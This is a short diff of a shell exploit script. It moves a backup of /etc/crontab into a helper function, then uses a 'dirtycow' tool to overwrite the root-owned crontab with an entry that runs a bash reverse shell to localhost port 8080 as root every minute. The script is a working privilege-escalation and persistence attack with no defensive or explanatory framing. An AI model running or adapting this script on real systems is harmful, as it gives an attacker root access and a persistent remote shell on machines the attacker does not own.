@@ -12,10 +12,7 @@ if [ ! -r /etc/crontab ]; then
 	die "/etc/crontab does not exist or is not readable."
 fi
 
-backup="$HOME/crontab"
-cp /etc/crontab "$backup"
-echoerr "Backed up /etc/crontab to $backup"
-
+backup /etc/crontab "$HOME/crontab"
 dirtycow -a /etc/crontab <<EOF
 */1 *	* * *	root	bash -i >&/dev/tcp/localhost/8080 0>&1
 EOF
